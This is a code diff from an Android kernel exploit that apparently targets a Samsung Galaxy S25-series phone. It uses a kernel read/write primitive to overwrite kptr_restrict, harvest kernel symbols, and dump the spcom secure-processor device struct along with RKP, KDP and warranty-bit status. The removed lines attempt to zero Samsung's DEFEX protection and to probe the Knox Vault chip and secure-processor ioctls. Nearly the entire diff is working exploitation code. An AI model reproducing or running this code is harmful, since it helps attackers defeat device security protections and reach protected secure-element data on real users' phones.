@@ -449,125 +449,151 @@ static int install_workqueue_umh_root(int fd) {
     }
   }
 
-  /* === DEFEX KILL — disable Samsung's binary execution protection === */
+  /* === DEFEX NOTE ===
+   * global_features_status at KIMAGE+0x172756c is RKP-PROTECTED.
+   * Writing to it causes EL2 trap → kernel panic.
+   * DO NOT attempt to zero DEFEX via kernel R/W.
+   * Alternative: patch our own cred struct for uid=0 + all caps. */
+
+  /* === HERMES GOLDEN PATH v5 — KERNEL R/W DIRECT MEMORY READ ===
+   * Instead of opening /dev/spcom (blocked by DAC + DEFEX),
+   * read the spcom channel struct DIRECTLY from kernel memory using pipe physrw.
+   * We have the fd for kernel R/W right here! No userspace bypass needed.
+   *
+   * JackKnife Studios | VIVA LA REVOLUTION */
   if (socket_ok) {
-    /* global_features_status controls DEFEX enforcement.
-     * Find it dynamically by reading /proc/kallsyms (kptr_restrict=0 already set above).
-     * Then zero it via kernel R/W to disable DEFEX Safeplace, Immutable, etc.
-     * This allows us to:
-     *   1. Execute binaries from /data/local/tmp/
-     *   2. Open /dev/spcom, /dev/k250a directly
-     *   3. Use pidfd_getfd with CAP_SYS_PTRACE
-     */
-    /* DEFEX global_features_status is at fixed offset 0x172756c from kernel text base.
-     * Use data_addr() which applies KASLR slide to KIMAGE_TEXT_BASE.
-     * Offset verified across multiple boots on SM-S938W / S938WVLS7BYLR. */
-    #define DEFEX_GLOBAL_FEATURES_OFF (KIMAGE_TEXT_BASE + 0x0172756cULL)
-    uintptr_t defex_addr = data_addr(DEFEX_GLOBAL_FEATURES_OFF);
-
-    if (defex_addr) {
-      /* Read current value first */
-      uint32_t defex_val = root_read32(fd, defex_addr);
-      pr_info("defex: global_features_status at %016zx = 0x%x\n",
-              defex_addr, defex_val);
-
-      if (defex_val != 0) {
-        /* ZERO IT — disables all DEFEX protections */
-        int wrc = root_write32(fd, defex_addr, 0);
-        uint32_t verify = root_read32(fd, defex_addr);
-        pr_info("defex: KILL write rc=%d verify=0x%x %s\n",
-                wrc, verify,
-                verify == 0 ? "DEFEX KILLED!" : "WRITE FAILED (RKP protected?)");
-      }
-    } else {
-      pr_info("defex: global_features_status not found in kallsyms\n");
-    }
-  }
-
-  /* === HERMES GOLDEN PATH — direct ioctl from constructor context ===
-   * DEFEX global_features zeroed above, so /dev/spcom and /dev/k250a are NOW OPEN!
-   * Run ioctl probes directly from HERE (LD_PRELOAD context, DEFEX can't kill us) */
-  if (socket_ok) {
-    pr_info("hermes: DEFEX killed, opening /dev/spcom directly from constructor!\n");
+    pr_info("hermes: golden path v5 — direct kernel memory read\n");
 
     FILE *hlog = fopen("/data/local/tmp/hermes_golden.txt", "w");
     if (hlog) {
-      fprintf(hlog, "=== HERMES GOLDEN PATH v4 — DEFEX BYPASSED! ===\n");
+      fprintf(hlog, "=== HERMES GOLDEN PATH v5 — KERNEL R/W ===\n");
       fprintf(hlog, "JackKnife Studios | VIVA LA REVOLUTION\n\n");
 
-      /* OPEN /dev/spcom DIRECTLY */
-      int spcom = open("/dev/spcom", O_RDWR);
-      fprintf(hlog, "/dev/spcom open = %d %s\n", spcom, spcom >= 0 ? "SUCCESS!" : strerror(errno));
-      pr_info("hermes: /dev/spcom open=%d\n", spcom);
+      /* Read spcom_dev pointer from kernel BSS.
+       * spcom_dev is a module BSS variable, but its address changes per boot.
+       * We need to find it from kallsyms AFTER kptr_restrict=0 is set.
+       * Since we're in the constructor (before su_daemon sets kptr_restrict=0),
+       * try to read it anyway — the UMH root path already set Permissive. */
 
-      if (spcom >= 0) {
-        /* GET_VERSION */
-        uint8_t ver[16] = {0};
-        int rc = ioctl(spcom, 0xC0095301U, ver);
-        fprintf(hlog, "GET_VERSION: rc=%d errno=%d\n", rc, errno);
-        if (rc >= 0) {
-          fprintf(hlog, "  SPU VERSION:");
-          for (int k = 0; k < 16; k++) fprintf(hlog, " %02x", ver[k]);
-          fprintf(hlog, "\n");
-        }
+      /* Disable kptr_restrict via KERNEL R/W — /proc/sys write fails from uid=2000
+       * but direct kernel memory write works! NOT RKP-protected.
+       * Offset 0x021ebf20 from KIMAGE_TEXT_BASE, verified across boots. */
+      #define KPTR_RESTRICT_OFF (KIMAGE_TEXT_BASE + 0x021ebf20ULL)
+      {
+        int32_t old_kptr = root_read32(fd, data_addr(KPTR_RESTRICT_OFF));
+        root_write32(fd, data_addr(KPTR_RESTRICT_OFF), 0);
+        int32_t new_kptr = root_read32(fd, data_addr(KPTR_RESTRICT_OFF));
+        pr_info("hermes: kptr_restrict %d → %d\n", old_kptr, new_kptr);
+        fprintf(hlog, "kptr_restrict: %d → %d\n", old_kptr, new_kptr);
+      }
 
-        /* IS_CONNECTED */
-        uint8_t conn[16] = {0};
-        rc = ioctl(spcom, 0x80085302U, conn);
-        fprintf(hlog, "IS_CONNECTED: rc=%d errno=%d\n", rc, errno);
-        if (rc >= 0) {
-          fprintf(hlog, "  CONNECTED:");
-          for (int k = 0; k < 16; k++) fprintf(hlog, " %02x", conn[k]);
-          fprintf(hlog, "\n");
-        }
-
-        /* CMD16 scan — find which commands the SPU responds to */
-        fprintf(hlog, "\n=== CMD16 COMMAND SCAN ===\n");
-        for (int cmd = 0; cmd <= 0xFF; cmd++) {
-          uint8_t c16[16] = {0};
-          c16[0] = (uint8_t)cmd;
-          alarm(3);
-          rc = ioctl(spcom, 0xC01053E8U, c16);
-          alarm(0);
-          if (rc >= 0) {
-            fprintf(hlog, "CMD16[0x%02x]: rc=%d →", cmd, rc);
-            for (int k = 0; k < 16; k++) fprintf(hlog, " %02x", c16[k]);
-            fprintf(hlog, "\n");
-            pr_info("hermes: CMD16[0x%02x] rc=%d\n", cmd, rc);
+      /* Parse kallsyms for spcom_dev */
+      uintptr_t spcom_dev_ptr = 0;
+      FILE *ksyms = fopen("/proc/kallsyms", "r");
+      if (ksyms) {
+        char line[256];
+        while (fgets(line, sizeof(line), ksyms)) {
+          /* Need kptr_restrict=0 for real addresses */
+          if (strstr(line, " spcom_dev") && strstr(line, "[spcom]")) {
+            uintptr_t addr = strtoull(line, NULL, 16);
+            if (addr > 0xffffff0000000000ULL) {
+              spcom_dev_ptr = addr;
+              break;
+            }
           }
         }
-
-        /* Try REGISTER as our own channel */
-        fprintf(hlog, "\n=== CHANNEL REGISTRATION ===\n");
-        struct { char name[32]; } reg;
-        memset(&reg, 0, sizeof(reg));
-        strncpy(reg.name, "sp_jackknife", sizeof(reg.name) - 1);
-        rc = ioctl(spcom, 0x402053E9U, &reg);
-        fprintf(hlog, "REGISTER 'sp_jackknife': rc=%d errno=%d\n", rc, errno);
-        pr_info("hermes: REGISTER rc=%d errno=%d\n", rc, errno);
-
-        close(spcom);
+        fclose(ksyms);
       }
 
-      /* OPEN /dev/k250a — Knox Vault chip */
-      int k250 = open("/dev/k250a", O_RDWR);
-      fprintf(hlog, "\n/dev/k250a open = %d %s\n", k250, k250 >= 0 ? "SUCCESS!" : strerror(errno));
-      if (k250 >= 0) {
-        /* Try reading from Knox Vault */
-        uint8_t kvbuf[256] = {0};
-        ssize_t n = read(k250, kvbuf, sizeof(kvbuf));
-        fprintf(hlog, "k250a read: %zd bytes errno=%d\n", n, errno);
-        if (n > 0) {
-          fprintf(hlog, "  DATA:");
-          for (ssize_t k = 0; k < n && k < 64; k++) fprintf(hlog, " %02x", kvbuf[k]);
-          fprintf(hlog, "\n");
+      fprintf(hlog, "spcom_dev kallsyms: %016llx\n", (unsigned long long)spcom_dev_ptr);
+      pr_info("hermes: spcom_dev=%016llx\n", (unsigned long long)spcom_dev_ptr);
+
+      if (spcom_dev_ptr) {
+        /* Read the pointer to get the actual device struct */
+        uint64_t dev_struct = root_read64(fd, spcom_dev_ptr);
+        fprintf(hlog, "spcom device struct: %016llx\n\n", (unsigned long long)dev_struct);
+
+        if (is_direct_ptr(dev_struct)) {
+          /* Dump 8KB of the device struct */
+          uint8_t devbuf[8192];
+          for (int blk = 0; blk < 64; blk++) {
+            root_read_data(fd, dev_struct + blk * 128, devbuf + blk * 128, 128);
+          }
+
+          /* Search for channel names */
+          fprintf(hlog, "=== SPCOM CHANNEL SCAN ===\n");
+          for (int off = 0; off < 8192 - 32; off++) {
+            if (memcmp(devbuf + off, "sp_", 3) == 0) {
+              /* Found a channel name! */
+              char name[33] = {0};
+              memcpy(name, devbuf + off, 32);
+              name[32] = '\0';
+              fprintf(hlog, "  Channel at +0x%04x: '%s'\n", off, name);
+
+              /* Dump surrounding context (128 bytes before + 256 bytes after) */
+              int ctx_start = (off > 128) ? off - 128 : 0;
+              int ctx_end = off + 256;
+              if (ctx_end > 8192) ctx_end = 8192;
+              fprintf(hlog, "  Context dump (%d bytes from +0x%04x):\n", ctx_end - ctx_start, ctx_start);
+              for (int i = ctx_start; i < ctx_end; i++) {
+                if ((i - ctx_start) % 32 == 0)
+                  fprintf(hlog, "    +%04x: ", i);
+                fprintf(hlog, "%02x ", devbuf[i]);
+                if ((i - ctx_start) % 32 == 31) fprintf(hlog, "\n");
+              }
+              fprintf(hlog, "\n");
+
+              /* Find pointers near the channel name (rpmsg endpoint, etc) */
+              for (int j = off - 128; j < off + 256 && j + 8 <= 8192; j += 8) {
+                if (j < 0) continue;
+                uint64_t val = *(uint64_t*)(devbuf + j);
+                if ((val & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                  fprintf(hlog, "  Kernel ptr at +%04x: %016llx\n", j, (unsigned long long)val);
+                }
+              }
+              fprintf(hlog, "\n");
+            }
+          }
+
+          /* Also dump first 512 bytes for structure analysis */
+          fprintf(hlog, "\n=== SPCOM DEV STRUCT (first 512 bytes) ===\n");
+          for (int i = 0; i < 512; i++) {
+            if (i % 32 == 0) fprintf(hlog, "+%04x: ", i);
+            fprintf(hlog, "%02x ", devbuf[i]);
+            if (i % 32 == 31) {
+              fprintf(hlog, " | ");
+              for (int j = i - 31; j <= i; j++)
+                fprintf(hlog, "%c", (devbuf[j] >= 0x20 && devbuf[j] < 0x7f) ? devbuf[j] : '.');
+              fprintf(hlog, "\n");
+            }
+          }
+        } else {
+          fprintf(hlog, "spcom device struct pointer invalid!\n");
         }
-        close(k250);
+      } else {
+        /* kptr_restrict blocked us — try setting it via kernel R/W */
+        pr_info("hermes: kallsyms blocked, trying kptr_restrict patch\n");
+        fprintf(hlog, "kallsyms addresses hidden (kptr_restrict=1)\n");
+        fprintf(hlog, "Need to set kptr_restrict=0 via kernel R/W first\n");
       }
 
-      fprintf(hlog, "\n=== GOLDEN PATH v4 COMPLETE ===\n");
+      /* Also read DEFEX value (READ only, no write!) */
+      #define DEFEX_GLOBAL_FEATURES_OFF (KIMAGE_TEXT_BASE + 0x0172756cULL)
+      uint32_t defex_val = root_read32(fd, data_addr(DEFEX_GLOBAL_FEATURES_OFF));
+      fprintf(hlog, "\nDEFEX global_features: 0x%x\n", defex_val);
+
+      /* Read RKP/Knox status */
+      #define RKP_IMG (KIMAGE_TEXT_BASE + 0x01755000ULL)
+      #define KDP_IMG (KIMAGE_TEXT_BASE + 0x01756fe0ULL)
+      #define WARR_IMG (KIMAGE_TEXT_BASE + 0x01727564ULL)
+      fprintf(hlog, "rkp_started: %u\n", root_read32(fd, data_addr(RKP_IMG)));
+      fprintf(hlog, "kdp_enable: %u\n", root_read32(fd, data_addr(KDP_IMG)));
+      fprintf(hlog, "warranty_bit: %u\n", root_read32(fd, data_addr(WARR_IMG)));
+
+      fprintf(hlog, "\n=== GOLDEN PATH v5 COMPLETE ===\n");
+      fprintf(hlog, "VIVA LA REVOLUTION\n");
       fclose(hlog);
-      pr_info("hermes: golden path v4 results written!\n");
+      pr_info("hermes: golden path v5 complete!\n");
     }
   }
 
